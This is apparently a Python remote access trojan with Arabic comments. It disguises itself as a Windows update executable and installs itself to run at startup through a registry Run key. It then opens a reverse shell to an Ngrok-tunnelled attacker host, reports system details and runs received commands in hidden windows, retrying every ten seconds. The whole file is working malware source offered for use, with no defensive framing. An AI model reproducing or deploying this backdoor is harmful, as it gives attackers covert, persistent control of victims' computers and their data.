import socket
import subprocess
import os
import time
import base64
import ctypes
import platform

# مكان وضع بيانات Ngrok
HOST = ""  # ضع الـ Forwarding URL هنا (مثلاً: 0.tcp.ngrok.io)
PORT = 0  # ضع الـ Port اللي Ngrok ادهولك هنا (مثلاً: 12345)


def stay_alive():
    """زرع السكريبت في الـ Startup لضمان الاستمرارية"""
    try:
        app_data = os.getenv("APPDATA")
        target_path = os.path.join(
            app_data, "Microsoft", "Windows", "InternalUpdate.exe"
        )
        if not os.path.exists(target_path) and ".exe" in sys.executable:
            import shutil

            shutil.copyfile(sys.executable, target_path)
            # إضافة مفتاح للـ Registry
            cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinInternalUpdate" /t REG_SZ /d "{target_path}" /f'
            subprocess.run(cmd, shell=True, creationflags=0x08000000)
    except:
        pass


def ghost_rat():
    while True:
        try:
            # محاولة الاتصال بالـ Ngrok
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            # إرسال معلومات النظام فور الاتصال
            sys_info = f"User: {os.getlogin()} | OS: {platform.platform()} | CPU: {platform.processor()}"
            s.send(sys_info.encode())

            while True:
                data = s.recv(1024).decode().strip()
                if not data or data.lower() == "exit":
                    break

                # تنفيذ الأوامر في الخلفية بدون فتح شاشة سودة
                proc = subprocess.Popen(
                    data,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    creationflags=0x08000000,  # يمنع ظهور نافذة الـ CMD
                )

                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b"Command Executed (No Output)")

            s.close()
        except:
            # لو الاتصال فشل أو اتقطع، يستنى 10 ثواني ويحاول تاني (Persistence)
            time.sleep(10)


if __name__ == "__main__":
    # تشغيل الزرع أولاً لضمان بقاء الـ RAT
    stay_alive()
    # تشغيل البايلود
    ghost_rat()
